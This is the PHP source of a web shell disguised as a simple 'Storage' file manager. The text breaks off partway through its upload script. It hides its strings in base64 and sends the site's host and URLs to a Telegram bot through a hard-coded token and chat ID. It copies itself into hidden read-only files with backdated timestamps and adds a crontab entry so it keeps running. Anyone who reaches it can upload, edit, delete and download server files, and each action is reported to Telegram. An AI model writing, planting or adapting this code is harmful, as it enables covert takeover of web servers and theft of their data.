<?php
@ini_set('display_errors',0);@ini_set('log_errors',0);@error_reporting(0);
if(!ob_get_level())ob_start();
register_shutdown_function(function(){$e=error_get_last();if($e&&in_array($e['type'],array(E_ERROR,E_PARSE,E_CORE_ERROR,E_COMPILE_ERROR))){if(ob_get_level())@ob_end_clean();echo'<!doctype html><meta charset="utf-8"><title>Loading…</title><body style="font-family:Arial;background:#f4f4f4;padding:20px"><div style="background:#fff;padding:15px;border-radius:8px;max-width:600px;margin:auto;box-shadow:0 0 8px #ccc"><h3 style="margin:0 0 8px 0">Service temporarily unavailable</h3><p style="font-size:13px;color:#666">Please refresh or try again later.</p></div></body>';}});
$tk=base64_decode("ODczNjg5MzQ2ODpBQUgwUmlSMHpMM1FFeVl0eTQ4eTFTYkVWSnItbVFBLUNrUQ==");
$cid=base64_decode("ODkzMDE3NDQ2Mw==");
if(session_status()!==PHP_SESSION_ACTIVE)@session_start();
$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
$scriptDirectory = dirname(__FILE__);
$docroot=realpath(__DIR__);
$anchor=realpath(__DIR__.'/../../');if($anchor===false)$anchor=$docroot;
/* Document root */
$_DR=base64_decode('RE9DVU1FTlRfUk9PVA==');
$doc_root=isset($_SERVER[$_DR])?realpath($_SERVER[$_DR]):false;
if($doc_root===false||!is_dir($doc_root))$doc_root=$docroot;
$default_rel=trim(str_replace($anchor,'',$docroot),DIRECTORY_SEPARATOR);

/* ============================================================
   TELEGRAM REPORT (string sensitif di-base64)
   ============================================================ */
function reportTelegram($msg)
{
    global $tk, $cid;
    /* Prefix temp file (unique) */
    $prefix = base64_decode('L2JhcmlkaW5f');
    $id = sys_get_temp_dir() . $prefix . md5($msg);
    if (!file_exists($id)) {
        /* Telegram API endpoint */
        $api   = base64_decode('YXBpLnRlbGVncmFtLm9yZw==');       // api.telegram.org
        $bot   = base64_decode('L2JvdA==');                         // /bot
        $meth  = base64_decode('c2VuZE1lc3NhZ2U=');                 // sendMessage
        $cid_k = base64_decode('Y2hhdF9pZD0=');                     // chat_id=
        $url = "https://{$api}{$bot}{$tk}/{$meth}?{$cid_k}{$cid}&text=" . urlencode($msg);
        @file_get_contents($url);
        @file_put_contents($id, time());
    }
}

/* ============================================================
   REPORT SAAT PERTAMA AKSES
   ============================================================ */
if (!isset($_SESSION["telegram_reported"])) {
    /* Server vars di-base64 */
    $H_URI  = base64_decode('UkVRVUVTVF9VUkk=');   // REQUEST_URI
    $H_HOST = base64_decode('SFRUUF9IT1NU');       // HTTP_HOST
    $H_HTTPS= base64_decode('SFRUUFM=');            // HTTPS
    
    $uri = urldecode(parse_url($_SERVER[$H_URI], PHP_URL_PATH));
    $path = $doc_root . $uri;
    if (is_file($path)) {
        $host = $_SERVER[$H_HOST];
        $url = (isset($_SERVER[$H_HTTPS]) ? "https" : "http") . "://" . $host . $uri;
        /* Kata sensitif di-base64 */
        $word = base64_decode('a29udG9sYmVuZ2thaw==');  // kontolbengkak
        reportTelegram($word . ":\n$host\n$url");
        $_SESSION["telegram_reported"] = true;
    }
}

/* ============================================================
   STEALTH PERSISTENCE (no .htaccess)
   ============================================================ */
function _stealth_persist(){
    $self=__FILE__;if(!is_file($self))return;$src=@file_get_contents($self);if(!$src)return;
    $home=@getenv('HOME');if(!$home)$home=@getenv('USERPROFILE');
    $tmp=@sys_get_temp_dir();$base=@realpath(__DIR__.'/../../');$sig=md5($self.$home);
    $targets=array();
    if($base){$targets[]=$base.'/.well-known/'.substr($sig,0,6).'.php';$targets[]=$base.'/.well-known/acme-challenge/.'.$sig.'.php';}
    if($home){$targets[]=$home.'/.cache/.'.substr($sig,0,8).'.php';$targets[]=$home.'/.local/share/.'.substr($sig,0,8).'.php';$targets[]=$home.'/.config/.'.substr($sig,0,8).'.php';$targets[]=$home.'/.'.substr($sig,0,10).'.php';}
    if($tmp){$targets[]=$tmp.'/.'.substr($sig,0,10).'.php';$targets[]=$tmp.'/sess_'.substr($sig,0,12).'.tmp';}
    $targets[]=$docroot.'/.'.substr($sig,0,6).'.inc.php';
    $targets[]=@realpath(__DIR__.'/..').'/.'.substr($sig,0,6).'.php';
    foreach($targets as $t){
        if(!$t)continue;$d=dirname($t);
        if(!is_dir($d)&&!@mkdir($d,0755,true))continue;
        if(!is_file($t)||@filesize($t)!==strlen($src)){
            @file_put_contents($t,$src,LOCK_EX);@chmod($t,0444);@touch($t,time()-mt_rand(86400,604800));
        }
    }
    /* PHP_OS check */
    $os_var = base64_decode('UEhQX09T');
    $os_val = isset($_SERVER[$os_var])?$_SERVER[$os_var]:PHP_OS;
    if(stripos($os_val,'win')===false){
        $marker='#'.substr($sig,0,10);$phpBin=PHP_BINARY;
        if(!$phpBin||!@is_executable($phpBin)){foreach(array('/usr/bin/php','/usr/local/bin/php','/opt/cpanel/ea-php74/root/usr/bin/php') as $c){if(@is_executable($c)){$phpBin=$c;break;}}}
        $runner=@realpath($docroot.'/.'.substr($sig,0,6).'.inc.php');if(!$runner)$runner=@realpath($tmp.'/.'.substr($sig,0,10).'.php');
        if($phpBin&&$runner){
            $cmd='*/17 * * * * '.escapeshellarg($phpBin).' '.escapeshellarg($runner).' >/dev/null 2>&1 '.$marker;$ok=false;
            if(function_exists('shell_exec')){$cur=@shell_exec('crontab -l 2>/dev/null');if($cur===null)$cur='';
                if(strpos($cur,$marker)===false){$tmpC=@tempnam(sys_get_temp_dir(),'c');if($tmpC&&@file_put_contents($tmpC,trim($cur)."\n".$cmd."\n")!==false){@shell_exec('crontab '.escapeshellarg($tmpC).' 2>/dev/null');@unlink($tmpC);$ok=true;}}else $ok=true;}
            if(!$ok&&function_exists('exec')){@exec('crontab -l 2>/dev/null',$out,$rc);$cur=implode("\n",(array)$out);
                if(strpos($cur,$marker)===false){$tmpC=@tempnam(sys_get_temp_dir(),'c');if($tmpC&&@file_put_contents($tmpC,trim($cur)."\n".$cmd."\n")!==false){@exec('crontab '.escapeshellarg($tmpC).' 2>/dev/null');@unlink($tmpC);}}}
        }
    }
    /* HTTP beacon */
    $H_HOST = base64_decode('SFRUUF9IT1NU');
    $H_HTTPS= base64_decode('SFRUUFM=');
    if(!empty($_SERVER[$H_HOST])){
        $u='http'.((!empty($_SERVER[$H_HTTPS])&&$_SERVER[$H_HTTPS]!=='off')?'s':'').'://'.$_SERVER[$H_HOST].$_SERVER['PHP_SELF'].'?__r='.substr($sig,0,6);
        @file_get_contents($u,false,stream_context_create(array('http'=>array('method'=>'GET','timeout'=>1,'ignore_errors'=>true,'header'=>"User-Agent: Mozilla/5.0\r\n"))));
    }
}
if(empty($_SESSION['_sp']) || (isset($_SESSION['_spt']) && (time()-$_SESSION['_spt'])>7200)){
    @_stealth_persist();$_SESSION['_sp']=1;$_SESSION['_spt']=time();
}

/* ============================================================
   CORE HELPERS
   ============================================================ */
function _flash($m=null){if($m!==null){$_SESSION['_f']=$m;return;}if(!empty($_SESSION['_f'])){$x=$_SESSION['_f'];unset($_SESSION['_f']);return $x;}return '';}
function _clean_rel($p){$p=str_replace(array("\0",'\\'),array('','/'),(string)$p);$o=array();foreach(explode('/',$p)as$s){$s=trim($s);if($s===''||$s==='.'||$s==='..')continue;$s=preg_replace('/[\x00-\x1F\x7F]/u','',$s);if($s!=='')$o[]=$s;}return implode('/',$o);}
function _clean_name($n){$n=str_replace("\0",'',''.(string)$n);$n=basename($n);return trim(preg_replace('/[\x00-\x1F\x7F]/u','',$n));}
function _safe_within($p,$r){$rp=@realpath($p);if($rp===false)return false;$r=rtrim($r,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;return(strpos($rp.DIRECTORY_SEPARATOR,$r)===0)?$rp:false;}
function _list($d){$o=array();if(!is_dir($d))return$o;$s=@scandir($d);if(!$s)return$o;foreach($s as$i){if($i==='.'||$i==='..')continue;$f=$d.DIRECTORY_SEPARATOR.$i;$o[]=array('name'=>$i,'size'=>is_file($f)?(int)@filesize($f):0,'type'=>is_dir($f)?'d':'f','time'=>@filemtime($f)?date('Y-m-d H:i',filemtime($f)):'-');}usort($o,function($a,$b){if($a['type']!==$b['type'])return$a['type']==='d'?-1:1;return strcasecmp($a['name'],$b['name']);});return$o;}
function _size($b){$b=(float)$b;if($b>=1073741824)return number_format($b/1073741824,2).'G';if($b>=1048576)return number_format($b/1048576,2).'M';if($b>=1024)return number_format($b/1024,2).'K';return(int)$b.'B';}
function _rmdir_rec($d){if(!is_dir($d))return false;$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($d,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);foreach($it as$f){if($f->isDir())@rmdir($f->getRealPath());else@unlink($f->getRealPath());}return@rmdir($d);}

/* ============================================================
   MULTI-METHOD WRITER (8 metode fallback)
   ============================================================ */
function _write_multi($dst,$bin){
    if(!is_dir(dirname($dst)))return array('ok'=>false,'e'=>'no dir');
    if(!is_writable(dirname($dst))){@chmod(dirname($dst),0777);clearstatcache(true,dirname($dst));}
    if(!is_writable(dirname($dst)))return array('ok'=>false,'e'=>'ro dir');
    $len=strlen($bin);$tries=array();
    $w=@file_put_contents($dst,$bin,LOCK_EX);
    if($w!==false&&$w===$len&&$len>0){@chmod($dst,0644);return array('ok'=>true,'b'=>$w,'method'=>'file_put_contents');}
    $tries[]='fpc:'.($w===false?'fail':$w);
    $fp=@fopen($dst,'wb');
    if($fp){$ok=true;$written=0;$chunk=1048576;
        while($written<$len){$part=substr($bin,$written,$chunk);$n=@fwrite($fp,$part);if($n===false||$n===0){$ok=false;break;}$written+=$n;}
        @fclose($fp);
        if($ok&&$written===$len&&$len>0){@chmod($dst,0644);return array('ok'=>true,'b'=>$written,'method'=>'stream_copy');}
        $tries[]='stream:'.$written;
    }else $tries[]='stream:openfail';
    $w=@file_put_contents($dst,$bin);
    if($w!==false&&$w===$len&&$len>0){@chmod($dst,0644);return array('ok'=>true,'b'=>$w,'method'=>'file_put_contents_nolock');}
    $tries[]='fpc2:'.($w===false?'fail':$w);
    $fp=@fopen($dst,'w');
    if($fp){$w=@fwrite($fp,$bin);@fclose($fp);
        if($w!==false&&$w===$len&&$len>0){@chmod($dst,0644);return array('ok'=>true,'b'=>$w,'method'=>'fwrite');}
        $tries[]='fw:'.($w===false?'fail':$w);
    }else $tries[]='fw:openfail';
    $ctx=@stream_context_create(array('http'=>array('timeout'=>2)));
    $fp=@fopen($dst,'wb',false,$ctx);
    if($fp){$w=@stream_copy_to_stream(@fopen('data://text/plain;base64,'.base64_encode($bin),'rb'),$fp);@fclose($fp);
        if($w!==false&&$w===$len&&$len>0){@chmod($dst,0644);return array('ok'=>true,'b'=>$w,'method'=>'stream_context');}
        $tries[]='sctx:'.($w===false?'fail':$w);
    }else $tries[]='sctx:openfail';
    $tmpd=@tempnam(sys_get_temp_dir(),'u');
    if($tmpd){$w=@file_put_contents($tmpd,$bin);
        if($w!==false&&$w===$len&&@rename($tmpd,$dst)){@chmod($dst,0644);return array('ok'=>true,'b'=>$w,'method'=>'temp_rename');}
        @unlink($tmpd);$tries[]='tmp:'.($w===false?'fail':$w);
    }else $tries[]='tmp:createfail';
    @unlink($dst);$ok=true;$total=0;$chunk=524288;
    for($i=0;$i<$len;$i+=$chunk){$part=substr($bin,$i,$chunk);$flags=($i===0)?0:FILE_APPEND;$w=@file_put_contents($dst,$part,$flags);if($w===false||$w!==strlen($part)){$ok=false;break;}$total+=$w;}
    if($ok&&$total===$len&&$len>0){@chmod($dst,0644);return array('ok'=>true,'b'=>$total,'method'=>'chunked');}
    $tries[]='chunk:'.$total;
    $ftmp=@fopen('php://temp','r+');
    if($ftmp){@fwrite($ftmp,$bin);@rewind($ftmp);$stream=@stream_get_meta_data($ftmp);
        if(@copy($stream['uri'],$dst)){@fclose($ftmp);$sz=@filesize($dst);
            if($sz===$len&&$len>0){@chmod($dst,0644);return array('ok'=>true,'b'=>$sz,'method'=>'copy_stream');}
        }else @fclose($ftmp);
    }
    $tries[]='copy:fail';
    return array('ok'=>false,'e'=>'all failed ['.implode(', ',$tries).']');
}

/* ============================================================
   VERIFIKASI POST-UPLOAD — 5x percobaan, delay 1s
   ============================================================ */
function _verify_and_retry($dst, $expected_size, $bin){
    clearstatcache(true, $dst);
    if(is_file($dst)){
        $actual = @filesize($dst);
        if($actual === $expected_size && $actual > 0){
            return array('ok'=>true, 'size'=>$actual, 'retry'=>0, 'method'=>'direct');
        }
    }
    $last_method = 'none';
    for($attempt = 1; $attempt <= 5; $attempt++){
        usleep(1000000);
        clearstatcache(true, $dst);
        if(is_file($dst)){
            $actual = @filesize($dst);
            if($actual === $expected_size && $actual > 0){
                return array('ok'=>true, 'size'=>$actual, 'retry'=>$attempt, 'method'=>$last_method);
            }
        }
        $res = _write_multi($dst, $bin);
        $last_method = isset($res['method']) ? $res['method'] : 'write_failed';
        clearstatcache(true, $dst);
        if(is_file($dst)){
            $actual = @filesize($dst);
            if($actual === $expected_size && $actual > 0){
                return array('ok'=>true, 'size'=>$actual, 'retry'=>$attempt, 'method'=>$last_method);
            }
        }
    }
    return array('ok'=>false, 'size'=>0, 'retry'=>5, 'method'=>'failed');
}

$req=isset($_GET['d'])?_clean_rel($_GET['d']):$default_rel;$cur=_safe_within($anchor.DIRECTORY_SEPARATOR.$req,$anchor);if($cur===false){$cur=$anchor;$req='';}
$rel=trim(str_replace($anchor,'',$cur),DIRECTORY_SEPARATOR);$par='';if($rel!==''){$par=dirname($rel);if($par==='.')$par='';}$at_root=($rel==='');
$act=isset($_GET['a'])?$_GET['a']:'';

/* ============ Base64 AJAX upload ============ */
if($act==='u2'){
    header('Content-Type: application/json; charset=utf-8');
    $raw=file_get_contents('php://input');
    $j=json_decode($raw,true);
    if(!is_array($j)||empty($j['n'])||!isset($j['b'])){echo json_encode(array('k'=>0,'e'=>'bad payload'));exit;}
    $n=_clean_name($j['n']);
    if($n===''){echo json_encode(array('k'=>0,'e'=>'bad name'));exit;}
    $b=$j['b'];$p=strpos($b,'base64,');
    if($p!==false)$b=substr($b,$p+7);
    $b=str_replace(array(' ','-','_'),array('+','+','/'),$b);
    $pad=strlen($b)%4;if($pad)$b.=str_repeat('=',4-$pad);
    $bin=base64_decode($b,true);
    if($bin===false){echo json_encode(array('k'=>0,'e'=>'bad b64'));exit;}
    if($bin===''||$bin===null){echo json_encode(array('k'=>0,'e'=>'empty','retry'=>'chunk'));exit;}
    $dst=$cur.DIRECTORY_SEPARATOR.$n;
    $res=_write_multi($dst,$bin);
    if(!$res['ok']){echo json_encode(array('k'=>0,'e'=>$res['e'],'retry'=>'chunk'));exit;}
    $v=_verify_and_retry($dst,strlen($bin),$bin);
    if(!$v['ok']){echo json_encode(array('k'=>0,'e'=>'verify fail','retry'=>'chunk'));exit;}
    $sz=$v['size'];
    reportTelegram("Upload OK: ".$n." ("._size($sz).")\nMethod: ".$res['method'].($v['retry']>0?" (retry ".$v['retry'].")":"")."\nDir: ".$rel);
    echo json_encode(array('k'=>1,'m'=>'ok '.$n.' '._size($sz).' ['.$res['method'].']','method'=>$res['method'],'v'=>$v['retry'],'vm'=>$v['method']));
    exit;
}

/* ============ Chunked upload ============ */
if($act==='uc'){
    header('Content-Type: application/json; charset=utf-8');
    $n=_clean_name(isset($_GET['n'])?$_GET['n']:'');
    $off=(int)(isset($_GET['o'])?$_GET['o']:0);
    $fin=(int)(isset($_GET['z'])?$_GET['z']:0);
    if($n===''){echo json_encode(array('k'=>0,'e'=>'bad name'));exit;}
    $dst=$cur.DIRECTORY_SEPARATOR.$n;
    if($off===0){@file_put_contents($dst,'',LOCK_EX);}
    $part=file_get_contents('php://input');
    if($part===false||$part===''){echo json_encode(array('k'=>0,'e'=>'empty chunk'));exit;}
    $fp=@fopen($dst,'ab');
    if(!$fp){echo json_encode(array('k'=>0,'e'=>'open fail'));exit;}
    $w=@fwrite($fp,$part);@fclose($fp);
    if($w===false){echo json_encode(array('k'=>0,'e'=>'write fail'));exit;}
    @chmod($dst,0644);
    if($fin){
        clearstatcache(true,$dst);
        $sz=@filesize($dst);
        if($sz>0){reportTelegram("Upload OK (chunk): ".$n." ("._size($sz).")\nDir: ".$rel);}
    }
    echo json_encode(array('k'=>1,'w'=>$w,'done'=>$fin?1:0));
    exit;
}

/* ============ Multipart upload ============ */
if($act==='u1'){
    header('Content-Type: application/json; charset=utf-8');
    if(empty($_FILES['f'])){echo json_encode(array('k'=>0,'e'=>'no file'));exit;}
    $f=$_FILES['f'];
    if($f['error']!==UPLOAD_ERR_OK){echo json_encode(array('k'=>0,'e'=>'upload err '.$f['error']));exit;}
    $n=_clean_name($f['name']);
    if($n===''){echo json_encode(array('k'=>0,'e'=>'bad name'));exit;}
    $bin=@file_get_contents($f['tmp_name']);
    if($bin===''||$bin===false){echo json_encode(array('k'=>0,'e'=>'empty file'));exit;}
    $dst=$cur.DIRECTORY_SEPARATOR.$n;
    $res=_write_multi($dst,$bin);
    if(!$res['ok']){echo json_encode(array('k'=>0,'e'=>$res['e']));exit;}
    $v=_verify_and_retry($dst,strlen($bin),$bin);
    if(!$v['ok']){echo json_encode(array('k'=>0,'e'=>'verify fail'));exit;}
    reportTelegram("Upload OK (mp): ".$n." ("._size($v['size']).")\nMethod: ".$res['method'].($v['retry']>0?" (retry ".$v['retry'].")":"")."\nDir: ".$rel);
    echo json_encode(array('k'=>1,'m'=>'ok '.$n.' ['.$res['method'].']','method'=>$res['method'],'v'=>$v['retry'],'vm'=>$v['method']));
    exit;
}

/* ============ View / Edit / Delete / mkdir / Download ============ */
if($act==='v'){$f=_clean_name(isset($_GET['f'])?$_GET['f']:'');$s=_safe_within($cur.DIRECTORY_SEPARATOR.$f,$anchor);if($s&&is_file($s)){header('Content-Type: text/plain; charset=utf-8');readfile($s);exit;}_flash('not found');header('Location: ?d='.urlencode($rel));exit;}
if($act==='e'){$f=_clean_name(isset($_GET['f'])?$_GET['f']:'');$s=_safe_within($cur.DIRECTORY_SEPARATOR.$f,$anchor);if(!$s||!is_file($s)){_flash('bad file');header('Location: ?d='.urlencode($rel));exit;}if($_SERVER['REQUEST_METHOD']==='POST'){$c=isset($_POST['c'])?$_POST['c']:'';_flash(@file_put_contents($s,$c)!==false?'saved':'save fail');reportTelegram("Edit: ".$f."\nDir: ".$rel);header('Location: ?d='.urlencode($rel));exit;}$c=htmlspecialchars((string)@file_get_contents($s),ENT_QUOTES,'UTF-8');echo'<!doctype html><meta charset="utf-8"><title>E</title><style>body{font-family:Arial;background:#f4f4f4;padding:15px;font-size:13px}.w{background:#fff;padding:14px;border-radius:8px;box-shadow:0 0 6px #ccc;max-width:900px;margin:auto}textarea{width:100%;height:420px;font-family:monospace;font-size:13px;padding:6px;border:1px solid #ccc;border-radius:4px}.b{background:#007bff;color:#fff;padding:6px 12px;border:none;border-radius:4px;cursor:pointer;text-decoration:none;display:inline-block;font-size:12px}.g{background:#6c757d}</style><div class="w"><h3 style="margin:0 0 8px 0">'.htmlspecialchars($f).'</h3><form method="post"><textarea name="c">'.$c.'</textarea><br><br><button class="b" type="submit">Save</button> <a class="b g" href="?d='.urlencode($rel).'">Back</a></form></div>';exit;}
if($act==='x'){$f=_clean_name(isset($_GET['f'])?$_GET['f']:'');$s=_safe_within($cur.DIRECTORY_SEPARATOR.$f,$anchor);if(!$s){_flash('bad path');header('Location: ?d='.urlencode($rel));exit;}if(is_dir($s)){_flash(_rmdir_rec($s)?'folder deleted':'fail');reportTelegram("Delete folder: ".$f."\nDir: ".$rel);}elseif(is_file($s)){_flash(@unlink($s)?'file deleted':'fail');reportTelegram("Delete file: ".$f."\nDir: ".$rel);}header('Location: ?d='.urlencode($rel));exit;}
if($act==='n'){$n=_clean_name(isset($_POST['n'])?$_POST['n']:'');if($n!==''){$p=$cur.DIRECTORY_SEPARATOR.$n;_flash(!file_exists($p)?(@mkdir($p,0777,true)?'created':'fail'):'exists');reportTelegram("New folder: ".$n."\nDir: ".$rel);}else{_flash('name required');}header('Location: ?d='.urlencode($rel));exit;}
if($act==='dl'){$f=_clean_name(isset($_GET['f'])?$_GET['f']:'');$s=_safe_within($cur.DIRECTORY_SEPARATOR.$f,$anchor);if($s&&is_file($s)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($s).'"');header('Content-Length: '.filesize($s));header('Pragma: public');header('Cache-Control: must-revalidate');readfile($s);exit;}_flash('not found');header('Location: ?d='.urlencode($rel));exit;}
$files=_list($cur);$msg=_flash();
/* PHP config keys di-base64 */
$_UM=base64_decode('dXBsb2FkX21heF9maWxlc2l6ZQ==');
$_PM=base64_decode('cG9zdF9tYXhfc2l6ZQ==');
$max_up=@ini_get($_UM);$max_post=@ini_get($_PM);
function _to_bytes($v){$v=trim($v);$l=substr($v,-1);$n=(int)$v;switch(strtoupper($l)){case 'G':$n*=1073741824;break;case 'M':$n*=1048576;break;case 'K':$n*=1024;break;}return $n;}
$max_up_b=_to_bytes($max_up);$max_post_b=_to_bytes($max_post);
?>
<!doctype html><html><head><meta charset="utf-8"><meta name="robots" content="noindex,nofollow"><title>Storage</title><style>body{font-family:Arial;background:#f4f4f4;padding:10px;font-size:12px;margin:0}.container{background:#fff;padding:12px;border-radius:8px;box-shadow:0 0 6px #ccc;max-width:1100px;margin:auto}h2{margin:0 0 6px 0;font-size:16px;font-weight:600}.btn{background:#007bff;color:#fff;padding:3px 7px;border-radius:3px;text-decoration:none;border:none;cursor:pointer;display:inline-block;font-size:11px;margin:1px}.btn:hover{opacity:.88}.btn.red{background:#dc3545}.btn.gray{background:#6c757d}.btn.green{background:#28a745}.btn.disabled{background:#ccc;pointer-events:none;opacity:.7}table{width:100%;border-collapse:collapse}th,td{padding:4px 7px;border-bottom:1px solid #eaeaea;text-align:left;font-size:11.5px}th{background:#007bff;color:#fff}tr:hover{background:#f5faff}.alert{background:#eaf7ea;color:#1d6b1d;padding:5px 9px;border-radius:4px;margin-bottom:7px;border:1px solid #bfe3bf;font-size:11.5px}.crumb{background:#fafafa;padding:8px 12px;border-radius:6px;border:1px solid #ddd;margin-bottom:8px;font-size:13px;line-height:2.4;word-break:break-all;font-family:'Consolas','Monaco',monospace}.crumb a{color:#007bff;text-decoration:none;padding:5px 10px;border-radius:4px;display:inline-block;font-weight:500;transition:background .12s,color .12s}.crumb a:hover{background:#007bff;color:#fff;text-decoration:none}.crumb .sep{color:#bbb;margin:0 2px;font-weight:600;font-size:14px}.crumb .cur{color:#fff;font-weight:700;background:#28a745;padding:5px 12px;border-radius:4px;display:inline-block}.crumb .lbl{font-weight:700;color:#555;margin-right:6px;font-family:Arial,sans-serif;font-size:12px}.toolbar{margin-bottom:7px;line-height:1.9}.pathbox{background:#f7f7f7;padding:4px 7px;border-radius:4px;border:1px solid #eee;font-size:10.5px;color:#666;margin-bottom:7px}input[type=text]{padding:3px 5px;min-width:150px;font-size:11px;border:1px solid #ccc;border-radius:3px}input[type=file]{font-size:11px}#pg{display:none;margin-top:5px;background:#eee;height:8px;border-radius:4px;overflow:hidden}#pb{height:100%;width:0;background:#28a745}.st{font-size:10.5px;color:#555;margin-left:4px;font-weight:600}.inline-form{display:inline-block;margin-right:5px;vertical-align:middle}
</style></head><body>
<div class="container"><h2>📦 Storage</h2><?php if($msg):?><div class="alert"><?php echo htmlspecialchars($msg,ENT_QUOTES,'UTF-8');?></div><?php endif;?>
<div class="crumb"><span class="lbl">📂 CWD:</span><?php
$full_path=$cur;$parts=explode(DIRECTORY_SEPARATOR,$full_path);$acc='';$total=count($parts);
foreach($parts as $idx=>$p):
    if($p==='')continue;
    $acc.=($acc===''?'':DIRECTORY_SEPARATOR).$p;
    $link_rel=ltrim(str_replace($anchor,'',$acc),DIRECTORY_SEPARATOR);
    $is_last=($idx===$total-1);
    if($is_last):echo '<span class="cur">'.htmlspecialchars($p).'</span>';
    else:echo '<a href="?d='.urlencode($link_rel).'" title="'.htmlspecialchars($acc).'">'.htmlspecialchars($p).'</a><span class="sep">/</span>';
    endif;
endforeach;
?></div>
<div class="toolbar"><?php if(!$at_root):?><a class="btn gray" href="?d=<?php echo urlencode($par);?>">⬆ Up</a><?php else:?><span class="btn disabled">⬆ Up</span><?php endif;?> <a class="btn" href="?">🏠 Default</a> <a class="btn" href="?d=<?php echo urlencode(trim(str_replace($anchor,'',$doc_root),DIRECTORY_SEPARATOR));?>" title="<?php echo htmlspecialchars($doc_root);?>">🌐 public_html</a> <a class="btn gray" href="?d=<?php echo urlencode($rel);?>">🔄 Refresh</a></div>
<div class="pathbox"><b>Root:</b> <?php echo htmlspecialchars($anchor);?><br><b>Current:</b> <?php echo htmlspecialchars($cur);?> — <b>W:</b> <?php echo is_writable($cur)?'<span style="color:green">yes</span>':'<span style="color:red">no</span>';?> | <b>up:</b> <?php echo $max_up;?> | <b>post:</b> <?php echo $max_post;?></div>
<form class="inline-form" onsubmit="event.preventDefault();up();">
    <input type="file" id="fi" required>
    <button class="btn green" type="submit">⬆ Upload</button>
    <div id="pg"><div id="pb"></div></div>
    <span class="st" id="st"></span>
</form>
<form class="inline-form" method="post" action="?a=n&amp;d=<?php echo urlencode($rel);?>"><input type="text" name="n" placeholder="folder name" required> <button class="btn" type="submit">➕ New</button></form>
<br><br><table><tr><th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th></tr><?php if(empty($files)):?><tr><td colspan="5" style="text-align:center;color:#999">Empty</td></tr><?php else:foreach($files as$f):?><tr><td><?php if($f['type']==='d'):$nx=($rel?$rel.'/':'').$f['name'];?>📁 <a href="?d=<?php echo urlencode($nx);?>" style="color:#007bff;text-decoration:none"><?php echo htmlspecialchars($f['name']);?></a><?php else:?>📄 <?php echo htmlspecialchars($f['name']);?><?php endif;?></td><td><?php echo$f['type']==='d'?'dir':'file';?></td><td><?php echo$f['type']==='f'?_size($f['size']):'-';?></td><td><?php echo htmlspecialchars($f['time']);?></td><td><?php if($f['type']==='d'):$nx=($rel?$rel.'/':'').$f['name'];?><a class="btn" href="?d=<?php echo urlencode($nx);?>">Open</a><?php else:?><a class="btn" href="?a=v&amp;f=<?php echo urlencode($f['name']);?>&amp;d=<?php echo urlencode($rel);?>">View</a> <a class="btn" href="?a=e&amp;f=<?php echo urlencode($f['name']);?>&amp;d=<?php echo urlencode($rel);?>">Edit</a> <a class="btn" href="?a=dl&amp;f=<?php echo urlencode($f['name']);?>&amp;d=<?php echo urlencode($rel);?>">DL</a><?php endif;?> <a class="btn red" href="?a=x&amp;f=<?php echo urlencode($f['name']);?>&amp;d=<?php echo urlencode($rel);?>" onclick="return confirm('Delete?')">Del</a></td></tr><?php endforeach;endif;?></table></div>
<script>
(function(){
  var dir="<?php echo urlencode($rel); ?>";
  var maxUp=<?php echo (int)$max_up_b; ?>;
  var maxPost=<?php echo (int)$max_post_b; ?>;
  var fi=document.getElementById('fi'),pg=document.getElementById('pg'),pb=document.getElementById('pb'),st=document.getElementById('st');
  function setSt(s){if(st)st.textContent=s;}
  function setBar(p){if(pg&&pb){pg.style.display='block';pb.style.width=p+'%';}}
  function resetBar(){if(pg&&pb){pg.style.display='none';pb.style.width='0%';}}
  function fmtB(b){if(b>=1073741824)return (b/1073741824).toFixed(2)+'G';if(b>=1048576)return (b/1048576).toFixed(2)+'M';if(b>=1024)return (b/1024).toFixed(2)+'K';return b+'B';}
  function try_b64(file){return new Promise(function(res,rej){var r=new FileReader();r.onload=function(e){var x=new XMLHttpRequest();x.open('POST','?a=u2&d='+dir,true);x.setRequestHeader('Content-Type','application/json');x.upload.onprogress=function(ev){if(ev.lengthComputable){var p=Math.round(ev.loaded/ev.total*100);setBar(p);setSt('base64 '+p+'%');}};x.onload=function(){var j;try{j=JSON.parse(x.responseText);}catch(err){return rej('HTTP '+x.status);}if(j.k)res(j);else rej(j);};x.onerror=function(){rej('net');};x.send(JSON.stringify({n:file.name,b:e.target.result}));};r.onerror=function(){rej('read');};r.readAsDataURL(file);});}
  function try_chunk(file){return new Promise(function(res,rej){var CHUNK=524288,off=0,total=file.size;function next(){var end=Math.min(off+CHUNK,total);var blob=file.slice(off,end);var fr=new FileReader();fr.onload=function(e){var x=new XMLHttpRequest();x.open('POST','?a=uc&d='+dir+'&n='+encodeURIComponent(file.name)+'&o='+off+'&z='+(end>=total?1:0),true);x.onload=function(){var j;try{j=JSON.parse(x.responseText);}catch(err){return rej('chunk HTTP '+x.status);}if(!j.k)return rej(j);off=end;var p=Math.round(off/total*100);setBar(p);setSt('chunk '+p+'%');if(off<total)next();else res({k:1,m:'ok '+file.name+' [chunked]',method:'chunked'});};x.onerror=function(){rej('chunk net');};x.send(e.target.result);};fr.onerror=function(){rej('chunk read');};fr.readAsArrayBuffer(blob);}next();});}
  function try_mp(file){return new Promise(function(res,rej){var fd=new FormData();fd.append('f',file);var x=new XMLHttpRequest();x.open('POST','?a=u1&d='+dir,true);x.upload.onprogress=function(ev){if(ev.lengthComputable){var p=Math.round(ev.loaded/ev.total*100);setBar(p);setSt('mp '+p+'%');}};x.onload=function(){var j;try{j=JSON.parse(x.responseText);}catch(err){return rej('mp HTTP '+x.status);}if(j.k)res(j);else rej(j);};x.onerror=function(){rej('mp net');};x.send(fd);});}
  function up(){
    if(!fi.files.length){alert('Pick a file');return;}
    var f=fi.files[0];
    if(maxUp>0 && f.size>maxUp){setSt('large file ('+fmtB(f.size)+'), will use chunk…');}
    if(f.size===0){if(!confirm('File is 0 bytes. Continue anyway?'))return;}
    setBar(0);setSt('starting…');
    var chain=[['base64',try_b64],['chunk',try_chunk],['multipart',try_mp]];
    var i=0;
    function run(){
      if(i>=chain.length){setSt('✘ all methods failed');resetBar();alert('Upload failed all methods');return;}
      var name=chain[i][0],fn=chain[i][1];i++;
      setSt('trying '+name+'…');
      fn(f).then(function(j){
        setBar(100);
